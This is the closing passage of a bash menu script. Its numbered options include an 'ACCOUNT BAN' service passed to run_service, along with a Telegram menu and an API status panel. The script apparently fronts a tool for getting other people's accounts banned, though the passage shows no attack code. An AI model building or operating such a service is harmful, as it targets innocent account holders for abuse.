                send_backend_event "service_selected"
                run_service "$SELECTED_SERVICE"
                ;;
            3|03)
                SELECTED_SERVICE="ACCOUNT BAN"
                send_backend_event "service_selected"
                run_service "$SELECTED_SERVICE"
                ;;
            4|04)
                about
                ;;
            5|05)
                telegram_menu
                ;;
            6|06)
                rerun_boot
                ;;
            7|07)
                rerun_script
                ;;
            8|08)
                api_status_panel
                ;;
            0|00|q|Q|exit)
                goodbye
                exit 0
                ;;
            *)
                echo ""
                echo -e \
                    "${RED}  ✖ UNKNOWN COMMAND — USE 00-08${RESET}"
                sleep 0.7
                ;;
        esac
    done
}

# =========================================================
# START
# =========================================================

main
